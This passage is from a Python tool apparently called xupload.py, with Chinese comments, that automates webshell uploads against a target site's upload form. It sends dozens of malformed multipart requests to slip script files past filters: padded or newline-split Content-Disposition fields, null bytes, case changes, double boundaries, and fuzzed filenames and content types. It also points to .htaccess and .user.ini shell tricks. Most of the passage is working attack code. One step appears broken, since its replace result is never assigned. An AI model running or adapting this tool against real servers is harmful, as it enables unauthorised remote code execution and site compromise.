            new_line = 'Content-Type: multipart/form-data; boundary=%s' % boundary_item['modify']['boundary']
            packet = work_packet.replace(origin_line, new_line)
            packet = packet.replace('filename="t3st.jpg"',
                                    'filename="t3st.%s"' % script_suffix)
        else:
            origin_line = b'Content-Type: multipart/form-data; boundary=%s' % boundary
            new_line = b'Content-Type: multipart/form-data; boundary=%s' % boundary_item['modify']['boundary']
            packet = work_packet.replace(origin_line, new_line)
            packet = packet.replace(
                b'filename="t3st.jpg"', b'filename="t3st.%s"' % unicode_to_bytes(script_suffix))
        rsp = post_multipart_form_data(packet)
        check_upload_succeed(packet, rsp, origin_html)

    # 修改Content-Disposition中的name字段值使filename字段前有超长内容,并修改后缀为webshell后缀
    name_item = {'desc': '修改Content-Disposition中的name字段的值,在name后面加超长字符,如Content-Disposition: form-data; name="uploaded"dddddd(超长d)dddd; filename="t3st.php"', 'modify': {
        'name': 'Content-Disposition: form-data; name="%s"%s; filename="t3st.%s"' % (form_file_param_name, 'd' * 2000, script_suffix)}}
    if not use_packet_file:
        origin_line = 'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
        packet = work_packet.replace(origin_line, name_item['modify']['name'])
    else:
        origin_line = b'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
        packet = work_packet.replace(
            origin_line, unicode_to_bytes(name_item['modify']['name']))
    print(name_item['desc'])
    rsp = post_multipart_form_data(packet)
    check_upload_succeed(packet, rsp, origin_html)

    # 修改Content-Disposition中的name部分形如name=\n"file",并修改后缀为webshell后缀
    name_item = {'desc': '修改Content-Disposition中的name部分形如name=\n"%s",并修改后缀为webshell后缀' % (form_file_param_name, script_suffix), 'modify': {
        'name': 'Content-Disposition: form-data; name=\n"%s"; filename="t3st.%s"' % (form_file_param_name, script_suffix)}}
    if not use_packet_file:
        origin_line = 'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
        packet = work_packet.replace(origin_line, name_item['modify']['name'])
    else:
        origin_line = b'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
        packet = work_packet.replace(
            origin_line, unicode_to_bytes(name_item['modify']['name']))
    print(name_item['desc'])
    rsp = post_multipart_form_data(packet)
    check_upload_succeed(packet, rsp, origin_html)

    # 修改Content-Disposition中的name部分形如nAme="file",并修改后缀为webshell后缀
    if not use_packet_file:
        new_line = 'Content-Disposition: form-data; nAme="%s"; filename="t3st.%s"' % (
            form_file_param_name, script_suffix)
        origin_line = 'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
    else:
        new_line = b'Content-Disposition: form-data; nAme="%s"; filename="t3st.%s"' % (
            form_file_param_name, script_suffix)
        origin_line = b'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
    packet = work_packet.replace(origin_line, new_line)
    print('修改Content-Disposition中的name部分形如nAme="%s",并修改后缀为webshell后缀' %
          form_file_param_name.decode('utf8'))
    rsp = post_multipart_form_data(packet)
    check_upload_succeed(packet, rsp, origin_html)

    # 修改Content-Disposition为:content-disposition:\n,并修改后缀为webshell后缀
    if not use_packet_file:
        origin_line = 'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
        new_line = 'Content-Disposition\n: form-data; name="%s"; filename="t3st.%s"' % (
            form_file_param_name, script_suffix)
    else:
        origin_line = b'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
        new_line = b'Content-Disposition\n: form-data; name="%s"; filename="t3st.%s"' % (
            form_file_param_name, script_suffix)
    packet = work_packet.replace(origin_line, new_line)
    print("修改Content-Disposition为:content-disposition:\n,并修改后缀为webshell后缀")
    rsp = post_multipart_form_data(packet)
    check_upload_succeed(packet, rsp, origin_html)

    # 删除Content-Disposition字段里的空格,并修改后缀为webshell后缀
    if not use_packet_file:
        origin_line = 'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
        new_line = 'Content-Disposition:form-data; name="%s"; filename="t3st.%s"' % (
            form_file_param_name, script_suffix)
    else:
        origin_line = b'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
        new_line = b'Content-Disposition:form-data; name="%s"; filename="t3st.%s"' % (
            form_file_param_name, script_suffix)
    packet = work_packet.replace(origin_line, new_line)
    print("删除Content-Disposition字段里的空格,并修改后缀为webshell后缀")
    rsp = post_multipart_form_data(packet)
    check_upload_succeed(packet, rsp, origin_html)

    # 去掉content-disposition的form-data字段,并修改后缀为webshell后缀
    if not use_packet_file:
        origin_line = 'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
        new_line = 'Content-Disposition: name="%s"; filename="t3st.%s"' % (
            form_file_param_name, script_suffix)
    else:
        origin_line = b'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
        new_line = b'Content-Disposition: name="%s"; filename="t3st.%s"' % (
            form_file_param_name, script_suffix)
    packet = work_packet.replace(origin_line, new_line)
    print("去掉content-disposition的form-data字段,并修改后缀为webshell后缀")
    rsp = post_multipart_form_data(packet)
    check_upload_succeed(packet, rsp, origin_html)

    # 删掉"content-disposition: form-data;"并修改后缀为webshell后缀
    if not use_packet_file:
        origin_line = 'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
        new_line = ' name="%s"; filename="t3st.%s"' % (
            form_file_param_name, script_suffix)
    else:
        origin_line = b'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
        new_line = b' name="%s"; filename="t3st.%s"' % (
            form_file_param_name, script_suffix)
    packet = work_packet.replace(origin_line, new_line)
    print('删掉"content-disposition: form-data;"并修改后缀为webshell后缀')
    rsp = post_multipart_form_data(packet)
    check_upload_succeed(packet, rsp, origin_html)

    # 修改为"content-disposition\00:",并修改后缀为webshell后缀
    if not use_packet_file:
        origin_line = 'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
        new_line = 'Content-Disposition\x00: name="%s"; filename="t3st.%s"' % (
            form_file_param_name, script_suffix)
    else:
        origin_line = b'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
        new_line = b'Content-Disposition\x00: name="%s"; filename="t3st.%s"' % (
            form_file_param_name, script_suffix)
    packet = work_packet.replace(origin_line, new_line)
    print('修改为"content-disposition\00:",并修改后缀为webshell后缀')
    rsp = post_multipart_form_data(packet)
    check_upload_succeed(packet, rsp, origin_html)

    # {char}+content-disposition,并修改后缀为webshell后缀
    if not use_packet_file:
        origin_line = 'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
        new_line = 'aContent-Disposition: name="%s"; filename="t3st.%s"' % (
            form_file_param_name, script_suffix)
    else:
        origin_line = b'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
        new_line = b'aContent-Disposition: name="%s"; filename="t3st.%s"' % (
            form_file_param_name, script_suffix)
    packet = work_packet.replace(origin_line, new_line)
    print('{char}+content-disposition,并修改后缀为webshell后缀')
    rsp = post_multipart_form_data(packet)
    check_upload_succeed(packet, rsp, origin_html)

    # head头的content-type: tab,并修改后缀为webshell后缀
    if not use_packet_file:
        origin_line = 'Content-Type: multipart/form-data; boundary=%s' % boundary
        new_line = 'Content-Type: \x09multipart/form-data; boundary=%s' % boundary
        packet = work_packet.replace(origin_line, new_line)
        packet = re.sub(r'filename="t3st.jpg"', 'filename="t3st.%s"' %
                        script_suffix, packet)
    else:
        origin_line = b'Content-Type: multipart/form-data; boundary=%s' % boundary
        new_line = b'Content-Type: \x09multipart/form-data; boundary=%s' % boundary
        packet = work_packet.replace(origin_line, new_line)
        packet = re.sub(b'filename="t3st.jpg"', b'filename="t3st.%s"' %
                        script_suffix, packet)
    print('head头的content-type: tab,并修改后缀为webshell后缀')
    rsp = post_multipart_form_data(packet)
    check_upload_succeed(packet, rsp, origin_html)

    # head头的content-type: multipart/form-DATA,并修改后缀为webshell后缀
    if not use_packet_file:
        origin_line = 'Content-Type: multipart/form-data;'
        new_line = 'Content-Type: multipart/form-DATA;'
        packet = work_packet.replace(origin_line, new_line)
        packet = re.sub(r'filename="t3st.jpg"', 'filename="t3st.%s"' %
                        script_suffix, packet)
    else:
        origin_line = b'Content-Type: multipart/form-data;'
        new_line = b'Content-Type: multipart/form-DATA;'
        packet = work_packet.replace(origin_line, new_line)
        packet = re.sub(b'filename="t3st.jpg"', b'filename="t3st.%s"' %
                        script_suffix, packet)
    print('head头的content-type: multipart/form-DATA,并修改后缀为webshell后缀')
    rsp = post_multipart_form_data(packet)
    check_upload_succeed(packet, rsp, origin_html)

    # head头的Content-Type: multipart/form-data;\n,并修改后缀为webshell后缀
    if not use_packet_file:
        origin_line = 'Content-Type: multipart/form-data; '
        new_line = 'Content-Type: multipart/form-data;\n'
        packet = work_packet.replace(origin_line, new_line)
        packet = re.sub(r'filename="t3st.jpg"', 'filename="t3st.%s"' %
                        script_suffix, packet)
    else:
        origin_line = b'Content-Type: multipart/form-data; '
        new_line = b'Content-Type: multipart/form-data;\n'
        packet = work_packet.replace(origin_line, new_line)
        packet = re.sub(b'filename="t3st.jpg"', b'filename="t3st.%s"' %
                        script_suffix, packet)
    print('head头的Content-Type: multipart/form-data;\n,并修改后缀为webshell后缀')
    rsp = post_multipart_form_data(packet)
    check_upload_succeed(packet, rsp, origin_html)

    # head头content-type空格:,并修改后缀为webshell后缀
    if not use_packet_file:
        origin_line = 'Content-Type: multipart/form-data;'
        new_line = 'Content-Type : multipart/form-data;'
        packet = work_packet.replace(origin_line, new_line)
        packet = re.sub(r'filename="t3st.jpg"', 'filename="t3st.%s"' %
                        script_suffix, packet)
    else:
        origin_line = b'Content-Type: multipart/form-data;'
        new_line = b'Content-Type : multipart/form-data;'
        packet = work_packet.replace(origin_line, new_line)
        packet = re.sub(b'filename="t3st.jpg"', b'filename="t3st.%s"' %
                        script_suffix, packet)
    print('head头content-type空格:,并修改后缀为webshell后缀')
    rsp = post_multipart_form_data(packet)
    check_upload_succeed(packet, rsp, origin_html)

    # form-data字段与name字段交换位置,并修改后缀为webshell后缀
    if not use_packet_file:
        origin_line = 'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
        new_line = 'name="%s"; Content-Disposition: form-data; filename="t3st.%s"' % (
            form_file_param_name, script_suffix)
    else:
        origin_line = b'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
        new_line = b'name="%s"; Content-Disposition: form-data; filename="t3st.%s"' % (
            form_file_param_name, script_suffix)
    packet = work_packet.replace(origin_line, new_line)
    print('form-data字段与name字段交换位置,并修改后缀为webshell后缀')
    rsp = post_multipart_form_data(packet)
    check_upload_succeed(packet, rsp, origin_html)

    # 双boundary,并修改后缀为webshell后缀
    if not use_packet_file:
        origin_line = '--%s\r\nContent-Disposition: form-data; name="%s"; filename="t3st.jpg"' % (
            boundary, form_file_param_name)
        new_line = '--%s\r\n--%s\r\nContent-Disposition: form-data; name="%s"; filename="t3st.jpg"' % (
            boundary, boundary, form_file_param_name)
        packet = work_packet.replace(origin_line, new_line)
        packet = re.sub(r'filename="t3st.jpg"', 'filename="t3st.%s"' %
                        script_suffix, packet)
    else:
        origin_line = b'--%s\r\nContent-Disposition: form-data; name="%s"; filename="t3st.jpg"' % (
            boundary, form_file_param_name)
        new_line = b'--%s\r\n--%s\r\nContent-Disposition: form-data; name="%s"; filename="t3st.jpg"' % (
            boundary, boundary, form_file_param_name)
        packet = work_packet.replace(origin_line, new_line)
        packet = re.sub(b'filename="t3st.jpg"', b'filename="t3st.%s"' %
                        script_suffix, packet)
    print('双boundary,并修改后缀为webshell后缀')
    rsp = post_multipart_form_data(packet)
    check_upload_succeed(packet, rsp, origin_html)

    # 修改成形如'Content-Disposition: form-data; name="image";
    # filename="085733uykwusqcs8vw8wky.png\r\nC.php"'
    if not use_packet_file:
        origin_line = 'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"\r\nContent-Type: image/jpeg' % form_file_param_name
        new_line = 'Content-Disposition: form-data; name="%s"; filename="t3st.jpg\r\nC.%s"' % (
            form_file_param_name, script_suffix)
    else:
        origin_line = b'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"\r\nContent-Type: image/jpeg' % form_file_param_name
        new_line = b'Content-Disposition: form-data; name="%s"; filename="t3st.jpg\r\nC.%s"' % (
            form_file_param_name, script_suffix)
    packet = work_packet.replace(origin_line, new_line)
    print('修改成形如Content-Disposition: form-data; name="%s"; filename="t3st.jpg\r\nC.%s"' %
          (form_file_param_name, script_suffix))
    rsp = post_multipart_form_data(packet)
    check_upload_succeed(packet, rsp, origin_html)

    # 修改filename为file\nname,并修改后缀为webshell后缀
    if not use_packet_file:
        origin_line = 'filename="t3st.jpg"'
        new_line = 'file\nname="t3st.%s"' % script_suffix
    else:
        origin_line = b'filename="t3st.jpg"'
        new_line = b'file\nname="t3st.%s"' % script_suffix
    work_packet.replace(origin_line, new_line)
    print('修改filename为file\nname')
    rsp = post_multipart_form_data(packet)
    check_upload_succeed(packet, rsp, origin_html)

    # filename在content-type下面,并修改后缀为webshell后缀
    if not use_packet_file:
        origin_line = 'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"\r\nContent-Type: image/jpeg' % form_file_param_name
        new_line = 'Content-Disposition: form-data; name="%s";\r\nContent-Type: image/jpeg\r\nfilename="t3st.%s"' % (
            form_file_param_name, script_suffix)
    else:
        origin_line = b'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"\r\nContent-Type: image/jpeg' % form_file_param_name
        new_line = b'Content-Disposition: form-data; name="%s";\r\nContent-Type: image/jpeg\r\nfilename="t3st.%s"' % (
            form_file_param_name, script_suffix)
    packet = work_packet.replace(origin_line, new_line)
    print('filename在content-type下面,并修改后缀为webshell后缀')
    rsp = post_multipart_form_data(packet)
    check_upload_succeed(packet, rsp, origin_html)

    # boundary和content-disposition中间插入换行
    if not use_packet_file:
        origin_string = '--%s\r\nContent-Disposition: form-data; name="%s"; filename="t3st.jpg"' % (
            boundary, form_file_param_name)
        new_string = '--%s\r\n\r\nContent-Disposition: form-data; name="%s"; filename="t3st.%s"' % (
            boundary, form_file_param_name, script_suffix)
    else:
        origin_string = b'--%s\r\nContent-Disposition: form-data; name="%s"; filename="t3st.jpg"' % (
            boundary, form_file_param_name)
        new_string = b'--%s\r\n\r\nContent-Disposition: form-data; name="%s"; filename="t3st.%s"' % (
            boundary, form_file_param_name, script_suffix)
    packet = work_packet.replace(origin_string, new_string)
    print("boundary和content-disposition中间插入换行,并修改后缀为webshell后缀")
    rsp = post_multipart_form_data(packet)
    check_upload_succeed(packet, rsp, origin_html)

    # 上传.htaccess或.user.ini或php.ini
    if script_suffix == "php":
        result = "请手动测试是否能通过上传.htaccess,.user.ini,php.ini来getshell.可参考如下:1).htaccess->https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet\n2).user.ini->https://ha.cker.in/1097.seo\n3)php.ini->http://rinige.com/index.php/archives/82/"
        print(result)
        if not use_packet_file:
            with open("output.txt", "a+") as f:
                f.write("%s\n\n" % (result) + '-' * 45 +
                        'I am a beautiful dividing line' + '-' * 45 + '\n\n')
        else:
            with open("output.txt", "ab+") as f:
                result = unicode_to_bytes(result)
                f.write(b"%s\n\n" % (result) + b'-' * 45 +
                        b'I am a beautiful dividing line' + b'-' * 45 + b'\n\n')

    # 修改filename且修改content-type
    for filename_item in fuzz_file_name:
        for content_type_item in fuzz_content_type:
            if not use_packet_file:
                filename = filename_item['modify']['filename']
                content_type = content_type_item['modify']['content_type']
                file_content = work_file_info['file_content']
                packet = re.sub(
                    r'''(?<=filename=")[^\s;]+(?=")''', filename, work_packet)
                # 如果content-type中有\x5c,正则替换时要处理下,要不然python会报错
                content_type = re.sub(r"\x5c", "\\" * 8, content_type)
                packet = re.sub(r"(?<=Content-Type: )\S+(?=\r\n)",
                                content_type, packet)
            else:
                filename = unicode_to_bytes(
                    filename_item['modify']['filename'])
                content_type = unicode_to_bytes(
                    content_type_item['modify']['content_type'])
                file_content = work_file_info['file_content']
                packet = re.sub(
                    b'''(?<=filename=")[^\s;]+(?=")''', filename, work_packet)
                # 如果content-type中有\x5c,正则替换时要处理下,要不然python会报错
                content_type = re.sub(b"\x5c", b"\\" * 8, content_type)
                packet = re.sub(b"(?<=Content-Type: )\S+(?=\r\n)",
                                content_type, packet)
            print(filename_item['desc'] + "  &&  " + content_type_item['desc'])
            rsp = post_multipart_form_data(packet)
            check_upload_succeed(packet, rsp, origin_html)


parser = argparse.ArgumentParser(
    description="xupload.py is a program that automates the testing of uploading functionality. If xupload.py does not successfully upload webshell, try more tips at:\n1.http://3xp10it.cc/web/2016/08/12/fckeditor各版本绕过/\n2.https://paper.seebug.org/219/\n3.http://www.owasp.org.cn/OWASP_Training/Upload_Attack_Framework.pdf\n4.https://thief.one/2016/09/22/上传木马姿势汇总-欢迎补充/")
parser.add_argument(
    "-u", "--url", help="The target url which has upload function")
parser.add_argument(
    "--cookie", help="HTTP Cookie header value")
parser.add_argument(
    "--suffix", required=True, help="The web server's script type: 'php','asp','aspx','jsp'")
parser.add_argument(
    "--batch", help="Never ask for user input, use the default behavior", action="store_true")
parser.add_argument(
    "--delay", help="Delay in seconds between each HTTP request")
parser.add_argument(
    "--force-ssl", help="Force usage of SSL/HTTPS", action="store_true")
parser.add_argument(
    "-r", help="Load HTTP request from a file")
args = parser.parse_args()
url = args.url
cookie = args.cookie
script_suffix = args.suffix
delay = args.delay
use_packet_file = args.r

"""
gif_file_content,jpg_file_content,png_file_content都是从正常的对应文件的16进制中
抽取的前2行和最后2行的16进制数据,如果要插入webshell内容则最好在第2行之后第3行之前

gif_file_content = '''
00000000: 4749 4638 3961 c800 c800 f700 0000 0000  GIF89a..........
00000010: 0000 3900 0041 0000 3100 0008 0000 2900  ..9..A..1.....).
0007c700: 84a2 2c6a 0545 109e 8160 2045 c896 7284  ..,j.E...` E..r.
0007c710: 9f59 0100 cf88 80cd 5944 4000 003b       .Y......YD@..;
'''
jpg_file_content = '''
00000000: ffd8 ffe0 0010 4a46 4946 0001 0101 0048  ......JFIF.....H
00000010: 0048 0000 ffdb 0043 0003 0202 0202 0203  .H.....C........
00000020: 4bff 007f 3ffa f457 4660 8327 f729 ff00  K...?..WF`.'.)..
00000030: 7c8a 2b4b 3ee3 e63f ffd9                 |.+K>..?..
'''
png_file_content = '''
00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
00000010: 0000 0118 0000 00d2 0806 0000 0091 8adf  ................
00000020: 6500 3138 304b 4242 b9fe 053d 0000 0000  e.180KBB...=....
00000030: 4945 4e44 ae42 6082                      IEND.B`.
'''
"""
gif_file_content = '\x47\x49\x46\x38\x39\x61\xc8\x00\xc8\x00\xf7\x00\x00\x00\x00\x00\x00\x00\x39\x00\x00\x41\x00\x00\x31\x00\x00\x08\x00\x00\x29\x00\x84\xa2\x2c\x6a\x05\x45\x10\x9e\x81\x60\x20\x45\xc8\x96\x72\x84\x9f\x59\x01\x00\xcf\x88\x80\xcd\x59\x44\x40\x00\x00\x3b'
jpg_file_content = '\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00\xff\xdb\x00\x43\x00\x03\x02\x02\x02\x02\x02\x03\x4b\xff\x00\x7f\x3f\xfa\xf4\x57\x46\x60\x83\x27\xf7\x29\xff\x00\x7c\x8a\x2b\x4b\x3e\xe3\xe6\x3f\xff\xd9'
png_file_content = '\x89\x50\x4e\x47\x0d\x0a\x1a\x0a\x00\x00\x00\x0d\x49\x48\x44\x52\x00\x00\x01\x18\x00\x00\x00\xd2\x08\x06\x00\x00\x00\x91\x8a\xdf\x65\x00\x31\x38\x30\x4b\x42\x42\xb9\xfe\x05\x3d\x00\x00\x00\x00\x49\x45\x4e\x44\xae\x42\x60\x82'

if use_packet_file:
    packet_file_bytes = b""
    with open(use_packet_file, "rb") as f:
        byte = f.read(1)
        while byte != b"":
            packet_file_bytes += byte
            byte = f.read(1)
    packet_file_bytes = re.sub(b"\r\n", b"\n", packet_file_bytes)
    packet_file_bytes = re.sub(b"\n", b"\r\n", packet_file_bytes)
    uri = re.search(b'^\S+\s+(\S+)\s+HTTP', packet_file_bytes).group(1)
    host = re.search(b'Host: ([^\r\s]+)', packet_file_bytes).group(1)
    if args.force_ssl:
        url = b'https://' + host + uri
    else:
        if b'https://' + host in packet_file_bytes:
            url = b'https://' + host + uri
        else:
            url = b'http://' + host + uri
    url = url.decode('utf8')
    referer = re.search(b'Referer: ([^\r\n]+)', packet_file_bytes).group(1)
    try:
        cookie = re.search(b'Cookie: ([^\r\n]+)', packet_file_bytes).group(1)
    except:
        cookie=b''

    rsp = get_request(referer.decode("utf8"), cookie=cookie.decode("utf8"))
    origin_html = rsp['content']
    boundary = re.search(
        b"Content-Type: multipart/form-data; boundary=([^\r\n]+)", packet_file_bytes, re.I).group(1)
    boundary = boundary.decode('utf8')
    form_file_param_name = re.search(
        b'''Content-Disposition: form-data; name="([^"]+)"; filename=.*''', packet_file_bytes, re.I).group(1)
    form_file_param_name = form_file_param_name.decode('utf8')
else:
    info = get_form_data_post_info(url, cookie)
    form_data_dict = info['form_data_dict']
    form_file_param_name = info['form_file_param_name']
    origin_html = info['origin_html']
    boundary = '-------------------------7df3069603d6'
    origin_packet = '''User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Referer: %s
Cookie: %s
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=%s''' % (url, cookie, boundary)
    data = []
    for key in form_data_dict:
        data.append('--%s\r\n' % boundary)
        value = form_data_dict[key]
        data.append('Content-Disposition: form-data; name="%s"\r\n\r\n' % key)
        data.append(value + "\r\n")
    data.append('--%s\r\n' % boundary)
    data.append('Content-Disposition: form-data; name="%s"; filename="t3st.jpg"\r\n' %
                (form_file_param_name))
    data.append('Content-Type: image/jpeg\r\n\r\n')
    data.append(jpg_file_content + "\r\n")
    data.append('--%s--' % boundary)
    data = ''.join(data)
    origin_packet = origin_packet.replace("\n", "\r\n") + "\r\n\r\n" + data
succeed_times = 0
if __name__ == "__main__":
    fuzz_upload_webshell()
